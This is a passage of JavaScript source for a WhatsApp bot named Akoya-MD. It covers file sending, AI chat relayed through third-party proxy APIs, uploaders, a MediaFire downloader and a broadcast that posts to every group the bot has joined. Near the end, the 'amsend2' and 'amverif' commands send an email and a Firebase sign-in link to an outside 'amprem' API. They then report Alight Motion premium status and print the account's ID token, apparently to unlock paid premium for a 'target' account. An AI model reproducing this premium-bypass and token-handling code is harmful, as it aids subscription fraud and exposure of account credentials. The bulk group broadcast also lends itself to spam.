    /// ───────── [ 𝖲𝖾𝗇𝖽 𝖥𝗂𝗅𝖾 𝖤𝗑𝗍𝖾𝗇𝗌𝗂𝗈𝗇 ] ───────── ///
    client.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
      let type = await client.getFile(path, true);
      let {
        res,
        data: file,
        filename: pathFile
      } = type;
      if (res && res.status !== 200 || file.length <= 65536) {
        try {
          throw {
            json: JSON.parse(file.toString())
          };
        } catch (e) {
          if (e.json) throw e.json;
        }
      }
      let opt = {
        filename
      };
      if (quoted) opt.quoted = quoted;
      if (!type) options.asDocument = true;
      let mtype = '',
        mimetype = type.mime,
        convert;
      if (/webp/.test(type.mime) || /image/.test(type.mime) && options.asSticker) mtype = 'sticker';else if (/image/.test(type.mime) || /webp/.test(type.mime) && options.asImage) mtype = 'image';else if (/video/.test(type.mime)) mtype = 'video';else if (/audio/.test(type.mime)) {
        convert = await (ptt ? toPTT : toAudio)(file, type.ext);
        file = convert.data;
        pathFile = convert.filename;
        mtype = 'audio';
        mimetype = 'audio/ogg; codecs=opus';
      } else mtype = 'document';
      if (options.asDocument) mtype = 'document';
      delete options.asSticker;
      delete options.asLocation;
      delete options.asVideo;
      delete options.asDocument;
      delete options.asImage;
      let message = {
        ...options,
        caption,
        ptt,
        [mtype]: {
          url: pathFile
        },
        mimetype
      };
      let m;
      try {
        m = await client.sendMessage(jid, message, {
          ...opt,
          ...options
        });
      } catch (e) {
        m = null;
      } finally {
        if (!m) m = await client.sendMessage(jid, {
          ...message,
          [mtype]: file
        }, {
          ...opt,
          ...options
        });
        file = null;
        return m;
      }
    };
    function generateRandomPassword() {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
      const length = 10;
      let password = '';
      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        password += characters[randomIndex];
      }
      return password;
    }
    function generateRandomNumber(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    const Reply = async teks => {
      return client.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
          externalAdReply: {
            title: botname,
            body: `© Powered By ${namaOwner}`,
            thumbnail: thumb,
            sourceUrl: null
          }
        }
      }, {
        quoted: qtext
      });
    };

    /// ───────── [ 𝖴𝗉𝗅𝗈𝖺𝖽𝖾𝗋 ] ───────── ///
    async function uploadPixhost(buffer, filename = "file.jpg") {
      try {
        const service = new ImageUploadService('pixhost.to');
        const {
          directLink
        } = await service.uploadFromBinary(buffer, filename);
        return directLink;
      } catch (e) {
        console.error('Pixhost Upload Error:', e.message);
        return null;
      }
    }
    async function uploadCatbox(buffer, filename = 'file.jpg') {
      const form = new FormData();
      form.set('reqtype', 'fileupload');
      form.set('fileToUpload', new Blob([buffer]), filename);
      const res = await fetch('https://catbox.moe/user/api.php', {
        method: 'POST',
        body: form
      });
      const data = await res.text();
      if (!data.startsWith('https://')) {
        throw new Error(data);
      }
      return data.trim();
    }
    function cleanHTML(text = '') {
      return text.replace(/<br\s*\/?>/gi, '\n').replace(/<\/p>/gi, '\n').replace(/<[^>]*>/g, '').replace(/&nbsp;/g, ' ').replace(/\n\s*\n/g, '\n').trim();
    }
    const NamaIcon = ['REVIEW', 'DOCUMENT', 'PROMOTION', 'OPENWEBVIEW'];
    function namaicon() {
      return NamaIcon[Math.floor(Math.random() * NamaIcon.length)];
    }

    /// ───────── [ 𝖠𝗎𝗍𝗈 𝖠𝖨 𝖢𝗁𝖺𝗍 ] ───────── ///
    global.autoClaude2 ??= {};
    if (global.autoClaude2[m.chat] && !isCmd && budy && !m.key.fromMe) {
      try {
        const axios = require("axios");
        let {
          data
        } = await axios.get(`https://api.synoxcloud.xyz/ai-chat/claude-opus-4.8?pesan=${encodeURIComponent(budy)}`);
        let replyClaude = "";
        if (typeof data === "string") {
          replyClaude = data;
        } else if (typeof data.result === "string") {
          replyClaude = data.result;
        } else if (typeof data.response === "string") {
          replyClaude = data.response;
        } else if (typeof data.message === "string") {
          replyClaude = data.message;
        } else if (typeof data.data === "string") {
          replyClaude = data.data;
        } else if (data.result && typeof data.result === "object") {
          replyClaude = data.result.answer || data.result.text || data.result.content || data.result.message || data.result.reply || data.result.response || "";
        }
        if (!replyClaude) {
          replyClaude = JSON.stringify(data, null, 2);
        }
        await xreply(String(replyClaude));
        return;
      } catch (e) {
        console.log("ClaudeAI2 Error:", e);
      }
    }
    global.autoClaude ??= {};
    if (global.autoClaude[m.chat] && !isCmd && budy && !m.key.fromMe) {
      try {
        const axios = require("axios");
        let {
          data
        } = await axios.get(`https://api.synoxcloud.xyz/ai-chat/claude-opus-4.5?pesan=${encodeURIComponent(budy)}`);
        let replyClaude = "";
        if (typeof data === "string") {
          replyClaude = data;
        } else if (typeof data.result === "string") {
          replyClaude = data.result;
        } else if (typeof data.response === "string") {
          replyClaude = data.response;
        } else if (typeof data.message === "string") {
          replyClaude = data.message;
        } else if (typeof data.data === "string") {
          replyClaude = data.data;
        } else if (data.result && typeof data.result === "object") {
          replyClaude = data.result.answer || data.result.text || data.result.content || data.result.message || data.result.reply || data.result.response || "";
        }
        if (!replyClaude) {
          replyClaude = JSON.stringify(data, null, 2);
        }
        await xreply(String(replyClaude));
        return;
      } catch (e) {
        console.log("Claude Error:", e);
      }
    }
    global.autoGPT ??= {};
    if (global.autoGPT[m.chat] && !isCmd && budy && !m.key.fromMe) {
      try {
        const axios = require("axios");
        if (quoted && /image/.test(mime)) {
          await xreply("⏳ uploading the image...");
          let media = await client.downloadAndSaveMediaMessage(qmsg);
          const {
            ImageUploadService
          } = require('node-upload-images');
          const service = new ImageUploadService('pixhost.to');
          let {
            directLink
          } = await service.uploadFromBinary(fs.readFileSync(media), 'Akoya-md.jpg');
          fs.unlinkSync(media);
          await xreply("🎨 editing the image...");
          let api = `https://api.synoxcloud.xyz/edit/gpt-image?imageUrl=${encodeURIComponent(directLink)}&prompt=${encodeURIComponent(budy)}`;
          await client.sendMessage(m.chat, {
            image: {
              url: api
            },
            caption: `✨ *GPT Image Editor*

📝 Prompt: ${budy}

🔗 Source: Pixhost`
          }, {
            quoted: m
          });
          return;
        }
        let {
          data
        } = await axios.get(`https://api.synoxcloud.xyz/ai-chat/gpt-5.5?pesan=${encodeURIComponent(budy)}`);
        let hasil = data?.result?.reply || data?.result?.message || data?.message || "no response";
        await xreply(String(hasil));
        return;
      } catch (e) {
        console.log("AutoGPT Error:", e);
      }
    }

    /// ───────── [ 𝖢𝗈𝗈𝗅𝖽𝗈𝗐𝗇 𝖧𝖾𝗅𝗉𝖾𝗋 ] ───────── ///
    global.cooldowns ??= new Map();
    function checkCooldown(userId, command, duration = 60000) {
      const key = `${userId}:${command}`;
      const now = Date.now();
      const expires = global.cooldowns.get(key);
      if (!expires || now >= expires) {
        return {
          allowed: true,
          remainingTime: 0
        };
      }
      return {
        allowed: false,
        remainingTime: Math.ceil((expires - now) / 1000)
      };
    }
    function recordUsage(userId, command, duration = 60000) {
      const key = `${userId}:${command}`;
      global.cooldowns.set(key, Date.now() + duration);
    }
    const ZX_CONFIG = {
      BASE_URL: 'https://auto-reaction.zxcoderid.web.id',
      TIMEOUT: 60000
    };
    async function getGroupList(client) {
      const groups = Object.values(await client.groupFetchAllParticipating());
      return groups.map(group => ({
        id: group.id,
        subject: group.subject,
        participants: group.participants?.length || 0
      }));
    }
    global.tempGroupStatusSelections = global.tempGroupStatusSelections || new Map();
    const jam = new Date().toLocaleTimeString('en-GB');
    let start = Date.now();
    let latensi = Date.now() - start;
    let total = totalfitur();

    /// ───────────── [ 𝖩𝖯𝖬 𝖦𝗋𝗈𝗎𝗉 𝖡𝗋𝗈𝖺𝖽𝖼𝖺𝗌𝗍 𝖧𝖾𝗅𝗉𝖾𝗋𝗌 ] ───────────── ///
    const getJpmText = () => String(text || m.quoted?.text || m.quoted?.body || '').trim();
    const getJpmMime = () => String(mime || qmsg?.mimetype || qmsg?.msg?.mimetype || '').trim();
    const broadcastJpmGroups = async (label, buildMessage) => {
      const allGroups = await client.groupFetchAllParticipating();
      const groups = Object.keys(allGroups || {}).filter(id => id.endsWith('@g.us'));
      const targets = groups.filter(id => global.db?.groups?.[id]?.blacklistjpm !== true);
      const skipped = groups.length - targets.length;
      const configuredDelay = Number(global.delayJpm);
      const delay = Number.isFinite(configuredDelay) && configuredDelay >= 0 ? configuredDelay : 3500;
      let sent = 0;
      let failed = 0;
      await xreply(`⏳ *Processing ${label}*\n` + `Target: *${targets.length} group*
` + (skipped ? `Skipped (blacklist JPM): *${skipped} group*` : "sending to all groups not blacklisted."));
      for (let index = 0; index < targets.length; index++) {
        const groupId = targets[index];
        try {
          await client.sendMessage(groupId, buildMessage(groupId));
          sent++;
        } catch (error) {
          failed++;
          console.error(`[${label}] failed to send to ${groupId}:`, error?.message || error);
        }
        if (delay > 0 && index < targets.length - 1) {
          await sleep(delay);
        }
      }
      await client.sendMessage(m.chat, {
        text: `✅ *${label} finished*\n` + `• success: *${sent} group*
` + `• failed: *${failed} group*
` + `• Blacklist skipped: *${skipped} group*`
      }, {
        quoted: m
      });
      return {
        sent,
        failed,
        skipped,
        total: groups.length
      };
    };
    const date = (() => {
      const parts = new Intl.DateTimeFormat('en-GB', {
        weekday: 'long',
        day: '2-digit',
        month: 'long',
        year: 'numeric',
        timeZone: 'Asia/Jakarta'
      }).formatToParts(new Date());
      const getPart = type => parts.find(part => part.type === type)?.value || '';
      return `${getPart('weekday')}, ${getPart('day')} - ${getPart('month')} - ${getPart('year')}`;
    })();
    /// ───────────── [ 𝖧𝖳𝖬𝖫 𝖦𝖺𝗆𝖾𝗌 ] ──────────── ///
    // Cards rendered by WhatsApp itself from a vendored HTML payload. Kept ahead of the
    // switch so `.chess` and friends cannot collide with a plain-text case.
    /// ───────────── [ 𝖦𝖺𝗆𝖾𝗌 ] ──────────── ///
    // Kept outside the switch: the games live in library/games.js and each one
    // answers from its own per-chat state, so `.snake up` is just another turn.
    if (global.htmlGameCommands && typeof global.htmlGameCommands[command] === 'function') {
      try {
        await global.htmlGameCommands[command]({
          client,
          m,
          textGames: global.games,
          text,
          q,
          prefix,
          command,
          reply,
          xreply
        });
      } catch (error) {
        console.error(`[htmlgame:${command}]`, util.format(error));
        await reply(`\`.${command}\` could not open: ${error?.message || error}`);
      }
      return;
    }

    if (global.games && typeof global.games[command] === 'function') {
      try {
        await global.games[command]({
          client,
          m,
          chatUpdate,
          store,
          args,
          text,
          q,
          prefix,
          command,
          reply,
          xreply,
          isOwner,
          isPremium,
          mess,
          sleep
        });
      } catch (error) {
        console.error(`[game:${command}]`, util.format(error));
        await reply(`\`.${command}\` hit an error: ${error?.message || error}`);
      }
      return;
    }
    switch (command) {
      /// ───────────── [ 𝖬𝖾𝗇𝗎 𝖴𝗍𝖺𝗆𝖺 ] ──────────── ///

      case "menu":
        {
          await menu(client, m, chatUpdate, store, args);
        }
        break;
      case "allmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '⏳',
              key: m.key
            }
          });
          await allmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "ownemenu":
      case "ownermenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '👑',
              key: m.key
            }
          });
          await ownermenu(client, m, chatUpdate, store, args);
        }
        break;
      case "jadibotmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🤖',
              key: m.key
            }
          });
          await jadibotmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "paymentmenu":
      case "paymenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '💳',
              key: m.key
            }
          });
          await paymentmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "aimenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '👾',
              key: m.key
            }
          });
          await aimenu(client, m, chatUpdate, store, args);
        }
        break;
      case "downloadmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '📥',
              key: m.key
            }
          });
          await downloadmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "stickermenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🧩',
              key: m.key
            }
          });
          await stickermenu(client, m, chatUpdate, store, args);
        }
        break;
      case "imagemenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🖼️',
              key: m.key
            }
          });
          await imagemenu(client, m, chatUpdate, store, args);
        }
        break;
      case "makermenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🚀',
              key: m.key
            }
          });
          await makermenu(client, m, chatUpdate, store, args);
        }
        break;
      case "toolsmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🔧',
              key: m.key
            }
          });
          await toolsmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "groupmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '👥',
              key: m.key
            }
          });
          await groupmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "jpmmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '📢',
              key: m.key
            }
          });
          await jpmmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "stalkmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '👀',
              key: m.key
            }
          });
          await stalkmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "searchmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🔎',
              key: m.key
            }
          });
          await searchmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "randommenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🎲',
              key: m.key
            }
          });
          await randommenu(client, m, chatUpdate, store, args);
        }
        break;
      case "storemenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🛒',
              key: m.key
            }
          });
          await storemenu(client, m, chatUpdate, store, args);
        }
        break;
      case "funmenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🎭',
              key: m.key
            }
          });
          await funmenu(client, m, chatUpdate, store, args);
        }
        break;
      case "gamemenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🎮',
              key: m.key
            }
          });
          await gamemenu(client, m, chatUpdate, store, args);
        }
        break;
      case "quotemenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🗯️',
              key: m.key
            }
          });
          await quotemenu(client, m, chatUpdate, store, args);
        }
        break;
      case "utilitymenu":
        {
          await client.sendMessage(m.chat, {
            react: {
              text: '🛠️',
              key: m.key
            }
          });
          await utilitymenu(client, m, chatUpdate, store, args);
        }
        break;

      /// ───────────── [ 𝖲𝖾𝖺𝗋𝖼𝗁 & 𝖥𝖾𝗍𝖼𝗁𝖾𝗋 ] ──────────── ///
      case "group":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("study group"));
            }
            await xreply("🔎 searching for the group...");
            const apiUrl = "https://api.nexray.eu.cc/search/groupsor?q=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("GROUPSOR RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !Array.isArray(data?.result)) {
              return xreply("❌ the API returned no valid results.");
            }
            const results = data.result;
            if (results.length === 0) {
              return xreply(`❌ no group found for: *${query}*`);
            }
            const limit = 50;
            const tampilkan = results.slice(0, limit);
            const total = results.length;
            let teks = `🔎 *SEARCH GROUP*\n` + `━━━━━━━━━━━━━━━━━━\n` + `🔍 Query: *${query}*\n` + `📊 Found: *${total} group*
` + `📋 Displayed: *${tampilkan.length} group*

`;
            tampilkan.forEach((group, index) => {
              teks += `*${index + 1}. ${group.name || "No name"}*\n` + `📝 ${group.description || "no description"}\n` + `📂 Kategori: ${group.category || "-"}\n` + `🌍 Negara: ${group.country || "-"}\n` + `🔗 ${group.url || "-"}\n\n`;
            });
            if (total > limit) {
              teks += `⚠️ _And ${total - limit} more groups..._

`;
            }
            teks += `━━━━━━━━━━━━━━━━━━\n` + `Akoya-MD`;
            await xreply(teks);
          } catch (err) {
            console.error("GROUPSOR ERROR:", err?.response?.data || err);
            return xreply("❌ failed to search for the group.\n" + "the API may be erroring or timed out.");
          }
        }
        break;

      /// ───────────── [ 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
      case "mfdl":
      case "mediafire":
        {
          const fs = require("fs");
          const path = require("path");
          const cheerio = require("cheerio");
          let filePath = null;
          try {
            const mediafireUrl = text?.trim();
            if (!mediafireUrl) {
              return xreply(example("https://www.mediafire.com/file/xxxxx/file"));
            }
            if (!/^https?:\/\/(www\.)?mediafire\.com\//i.test(mediafireUrl)) {
              return xreply("❌ invalid MediaFire URL.");
            }
            await xreply("⏳ *MEDIAFIRE DOWNLOADER*\n\n" + "🔎 searching for the download link...");
            const session = axios.create({
              headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " + "AppleWebKit/537.36 (KHTML, like Gecko) " + "Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
              },
              timeout: 30000,
              maxRedirects: 10
            });
            const response = await session.get(mediafireUrl);
            const $ = cheerio.load(response.data);
            let downloadUrl = null;
            downloadUrl = $("#downloadButton").attr("href") || null;
            if (!downloadUrl) {
              downloadUrl = $("a.download_link").attr("href") || null;
            }
            if (!downloadUrl) {
              const links = $('a[href*="download"]');
              if (links.length > 0) {
                downloadUrl = links.first().attr("href") || null;
              }
            }
            if (!downloadUrl) {
              const match = response.data.match(/href="(https:\/\/download\d+\.mediafire\.com\/[^"]+)"/);
              if (match) {
                downloadUrl = match[1];
              }
            }
            if (!downloadUrl) {
              return xreply("❌ MediaFire direct download not found.");
            }
            if (downloadUrl.startsWith("/")) {
              downloadUrl = new URL(downloadUrl, mediafireUrl).href;
            }
            await xreply("📥 Link download ditemukan.\n" + "⬇️ downloading the file...");
            const outputDir = path.join(process.cwd(), "downloads");
            if (!fs.existsSync(outputDir)) {
              fs.mkdirSync(outputDir, {
                recursive: true
              });
            }
            let filename = null;
            try {
              const urlObj = new URL(downloadUrl);
              filename = path.basename(decodeURIComponent(urlObj.pathname));
            } catch (e) {}
            if (!filename || filename === "/" || filename === ".") {
              filename = $("div.filename").first().text().trim() || $("meta[property='og:title']").attr("content") || "mediafire_file";
            }
            filename = filename.replace(/[<>:"/\\|?*\x00-\x1F]/g, "_").trim();
            if (!filename) {
              filename = "mediafire_file";
            }
            filePath = path.join(outputDir, `${Date.now()}_${filename}`);
            const fileResponse = await session.get(downloadUrl, {
              responseType: "arraybuffer",
              timeout: 300000,
              maxContentLength: Infinity,
              maxBodyLength: Infinity
            });
            fs.writeFileSync(filePath, Buffer.from(fileResponse.data));
            const stats = fs.statSync(filePath);
            if (!stats.size) {
              throw new Error("Downloaded file is empty.");
            }
            const sizeMB = (stats.size / 1024 / 1024).toFixed(2);
            await xreply(`✅ *download complete*

` + `📁 File: *${filename}*\n` + `📦 Size: *${sizeMB} MB*\n\n` + `📤 sending the file...`);
            const ext = path.extname(filename).toLowerCase();
            const mimeMap = {
              ".zip": "application/zip",
              ".rar": "application/vnd.rar",
              ".7z": "application/x-7z-compressed",
              ".pdf": "application/pdf",
              ".txt": "text/plain",
              ".json": "application/json",
              ".js": "text/javascript",
              ".html": "text/html",
              ".css": "text/css",
              ".apk": "application/vnd.android.package-archive",
              ".mp3": "audio/mpeg",
              ".mp4": "video/mp4",
              ".jpg": "image/jpeg",
              ".jpeg": "image/jpeg",
              ".png": "image/png",
              ".webp": "image/webp",
              ".gif": "image/gif"
            };
            const mimetype = mimeMap[ext] || "application/octet-stream";
            await client.sendMessage(m.chat, {
              document: fs.readFileSync(filePath),
              mimetype: mimetype,
              fileName: filename,
              caption: `📁 *${filename}*\n` + `📦 ${sizeMB} MB\n` + `🔗 Source: MediaFire`
            }, {
              quoted: m
            });
          } catch (err) {
            console.error("MEDIAFIRE ERROR:", err?.response?.data || err);
            await xreply("❌ *MEDIAFIRE download failed*\n\n" + `${err?.message || "an error occurred during the download."}`);
          } finally {
            try {
              if (filePath && fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
              }
            } catch (e) {
              console.error("failed to delete the temporary file:", e);
            }
          }
        }
        break;

      /// ───────────── [ 𝖢𝖺𝗍𝖻𝗈𝗑 𝖴𝗉𝗅𝗈𝖺𝖽𝖾𝗋 ] ──────────── ///
      case "catbox":
        {
          const fs = require("fs");
          const path = require("path");
          const FormData = require("form-data");
          const BASE = "https://catbox.moe";
          const JS_URL = `${BASE}/resources/uploadform.js`;
          const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " + "AppleWebKit/537.36 (KHTML, like Gecko) " + "Chrome/126.0.0.0 Safari/537.36";
          const MIME = {
            ".png": "image/png",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".gif": "image/gif",
            ".webp": "image/webp",
            ".txt": "text/plain",
            ".pdf": "application/pdf",
            ".mp4": "video/mp4",
            ".zip": "application/zip",
            ".rar": "application/vnd.rar",
            ".7z": "application/x-7z-compressed",
            ".mp3": "audio/mpeg",
            ".m4a": "audio/mp4",
            ".wav": "audio/wav"
          };
          const timeoutSignal = (ms = 600000) => {
            const controller = new AbortController();
            const timer = setTimeout(() => {
              controller.abort();
            }, ms);
            timer.unref?.();
            return controller.signal;
          };
          const scrapeForm = async () => {
            const res = await fetch(BASE, {
              headers: {
                "User-Agent": UA
              },
              signal: timeoutSignal(30000)
            });
            if (!res.ok) {
              throw new Error(`failed to open Catbox: HTTP ${res.status}`);
            }
            const html = await res.text();
            const match = html.match(/<form[^>]*class="dropzone"[^>]*>[\s\S]*?<\/form>/i) || html.match(/<form[^>]*id="dropzoneUpload"[^>]*>[\s\S]*?<\/form>/i);
            if (!match) {
              throw new Error("Catbox upload form not found.");
            }
            const formHtml = match[0];
            const actionMatch = formHtml.match(/action="([^"]+)"/i);
            if (!actionMatch) {
              throw new Error("Catbox upload action not found.");
            }
            const action = BASE + "/" + actionMatch[1].replace(/^\//, "");
            const fields = {};
            for (const tag of formHtml.match(/<input[^>]*>/gi) || []) {
              const type = tag.match(/\btype="([^"]*)"/i)?.[1];
              const name = tag.match(/\bname="([^"]*)"/i)?.[1];
              const value = tag.match(/\bvalue="([^"]*)"/i)?.[1];
              if (type?.toLowerCase() === "hidden" && name) {
                fields[name] = value || "";
              }
            }
            return {
              action,
              fields
            };
          };
          const scrapeJsParam = async () => {
            const res = await fetch(JS_URL, {
              headers: {
                "User-Agent": UA
              },
              signal: timeoutSignal(30000)
            });
            if (!res.ok) {
              throw new Error(`failed to fetch uploadform.js: HTTP ${res.status}`);
            }
            const js = await res.text();
            const match = js.match(/paramName\s*:\s*"([^"]+)"/);
            if (!match) {
              throw new Error("Catbox upload paramName not found.");
            }
            return match[1];
          };
          const uploadFile = async (filePath, form, fileField) => {
            const fd = new FormData();
            for (const [key, value] of Object.entries(form.fields)) {
              fd.append(key, value);
            }
            const ext = path.extname(filePath).toLowerCase();
            fd.append(fileField, fs.createReadStream(filePath), {
              filename: path.basename(filePath),
              contentType: MIME[ext] || "application/octet-stream"
            });
            const axios = require("axios");
            const res = await axios.post(form.action, fd, {
              headers: {
                ...fd.getHeaders(),
                "User-Agent": UA,
                "Referer": `${BASE}/`,
                "Origin": BASE,
                "X-Requested-With": "XMLHttpRequest"
              },
              maxBodyLength: Infinity,
              maxContentLength: Infinity,
              timeout: 600000,
              validateStatus: () => true
            });
            const body = String(res.data || "").trim();
            if (res.status === 200 && /^https?:\/\/(i|litterbox)\.catbox\.moe\//i.test(body)) {
              return body;
            }
            if (res.status === 412 && /invalid uploader/i.test(body)) {
              throw new Error("Catbox rejected this server's IP (412 Invalid uploader).");
            }
            throw new Error(`Catbox failed (HTTP ${res.status}): ${body.slice(0, 300)}`);
          };
          const uploadViaUrl = async (url, form) => {
            const axios = require("axios");
            const fd = new FormData();
            fd.append("reqtype", "urlupload");
            fd.append("userhash", form.fields.userhash || "");
            fd.append("url", url);
            const res = await axios.post(form.action, fd, {
              headers: {
                ...fd.getHeaders(),
                "User-Agent": UA,
                "Referer": `${BASE}/`
              },
              timeout: 600000,
              validateStatus: () => true
            });
            const body = String(res.data || "").trim();
            if (res.status === 200 && body.startsWith("http")) {
              return body;
            }
            if (res.status === 412 && /invalid uploader/i.test(body)) {
              throw new Error("Catbox rejected this server's IP (412 Invalid uploader).");
            }
            throw new Error(`URL upload failed (HTTP ${res.status}): ${body.slice(0, 300)}`);
          };
          let media = null;
          try {
            const input = text?.trim();
            if (input && /^https?:\/\//i.test(input)) {
              await xreply("⏳ Mengupload URL ke Catbox...");
              const form = await scrapeForm();
              const result = await uploadViaUrl(input, form);
              return xreply("✅ *CATBOX upload complete*\n\n" + `🔗 ${result}`);
            }
            const qmsg = m.quoted || m;
            const mime = qmsg?.mime || "";
            if (!mime) {
              return xreply(example("reply to a photo/video/file or paste a URL"));
            }
            await xreply("⏳ Mengupload media ke Catbox...");
            media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media || !fs.existsSync(media)) {
              throw new Error("File media failed didownload.");
            }
            const form = await scrapeForm();
            const fileField = await scrapeJsParam();
            const result = await uploadFile(media, form, fileField);
            await xreply("✅ *CATBOX upload complete*\n\n" + `🔗 ${result}`);
          } catch (err) {
            console.error("CATBOX ERROR:", err?.response?.data || err?.message || err);
            await xreply("❌ *CATBOX upload failed*\n\n" + `${err?.message || "an error occurred."}`);
          } finally {
            try {
              if (media && fs.existsSync(media)) {
                fs.unlinkSync(media);
              }
            } catch (e) {
              console.error("failed to delete the temporary file:", e);
            }
          }
        }
        break;

      /// ───────────── [ 𝖠𝖬 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 ] ──────────── ///
      case "amsend2":
        {
          try {
            const email = text?.trim();
            if (!email) {
              return xreply(example("user@gmail.com"));
            }
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
              return xreply("❌ invalid email format.\n\n" + example("user@gmail.com"));
            }
            await xreply("📨 sending the verification link to the email...\n" + "⏳ please wait...");
            const response = await axios.get("https://v2.api-varhad.my.id/tools/amprem/verif/email", {
              params: {
                email: email
              },
              headers: {
                "Accept": "application/json"
              },
              timeout: 60000
            });
            const data = response.data;
            console.log("AMSEND V2 RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result?.success) {
              return xreply("❌ failed to send the verification link.\n" + `message: ${data?.result?.message || "the API returned no valid response."}`);
            }
            await xreply("✅ *AM SEND V2 success*\n" + "━━━━━━━━━━━━━━━━━━\n" + `📧 Email: ${email}\n` + `📩 Status: ${data.result.message || "Link sent."}\n\n` + `_Check the target's inbox/spam, then grab link the verification and run:_\n` + example(`${prefix}amverif2 ${email}|https://alight-creative.firebaseapp.com/__/auth/links?link=...`));
          } catch (err) {
            console.error("AMSEND V2 ERROR:", err?.response?.data || err);
            const errorData = err?.response?.data;
            return xreply("❌ failed to send the verification link.\n\n" + (errorData ? JSON.stringify(errorData, null, 2) : err.message));
          }
        }
        break;
      case "amverif":
        {
          try {
            const input = text?.trim();
            if (!input) {
              return xreply(example("user@gmail.com|https://alight-creative.firebaseapp.com/__/auth/links?link=xxxx"));
            }
            const separator = input.indexOf("|");
            if (separator === -1) {
              return xreply("❌ wrong format.\n\n" + "use the separator `|` between the email and the link:\n" + example("user@gmail.com|https://alight-creative.firebaseapp.com/__/auth/links?link=xxxx"));
            }
            const email = input.slice(0, separator).trim();
            const link = input.slice(separator + 1).trim();
            if (!email) {
              return xreply("❌ the email must not be empty.");
            }
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
              return xreply("❌ invalid email format.");
            }
            if (!/^https?:\/\//i.test(link)) {
              return xreply("❌ invalid verification link.\n" + "the link must start with http:// or https://");
            }
            await xreply("🔐 verifying AM Premium...\n" + "⏳ please wait...");
            const response = await axios.get("https://v2.api-varhad.my.id/tools/amprem/verif/link", {
              params: {
                email: email,
                link: link
              },
              headers: {
                "Accept": "application/json"
              },
              timeout: 120000
            });
            const data = response.data;
            console.log("AM VERIF V2 RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result?.success) {
              return xreply("❌ Verifikasi failed.\n" + `message: ${data?.result?.message || "the API returned no valid response."}`);
            }
            const result = data.result;
            let hasil = "";
            if (result.user || result.idToken || result.premium) {
              const user = result.user || {};
              const premium = result.premium?.data?.result || {};
              hasil = "🔐 *AM VERIF V2 success*\n" + "━━━━━━━━━━━━━━━━━━\n" + `👤 name: ${user.displayName || "-"}\n` + `📧 Email    : ${user.email || email}\n` + `✔️ Verified : ${user.emailVerified ? "Yes" : "No"}\n` + `👑 Premium  : ${premium.valid ? "enabled ✅" : "inactive ❌"}\n` + `🔁 AutoRenew: ${premium.autoRenewing ? "Yes" : "No"}\n` + `📅 Expired  : ${premium.expiryTimeMillis ? new Date(Number(premium.expiryTimeMillis)).toLocaleString("en-GB") : "-"}\n\n` + (result.idToken ? `🔑 *ID Token:*\n${result.idToken}\n\n` : "") + "━━━━━━━━━━━━━━━━━━\n" + `👤 Author: ${global.botname}`;
            } else {
              hasil = "🔐 *AM VERIF V2 success*\n" + "━━━━━━━━━━━━━━━━━━\n" + `📧 Email: ${email}\n` + `📩 Status: ${result.message || "success."}\n` + "━━━━━━━━━━━━━━━━━━\n" + `👤 Author: ${global.botname}`;
            }
            await xreply(hasil);
          } catch (err) {
            console.error("AM VERIF V2 ERROR:", err?.response?.data || err);
            const errorData = err?.response?.data;
            return xreply("❌ Verifikasi failed.\n\n" + (errorData ? JSON.stringify(errorData, null, 2) : err.message));
          }
        }
        break;
      case "amsend":
        {
          try {
            const email = text?.trim();
            if (!email) {
              return xreply(example("user@gmail.com"));
            }
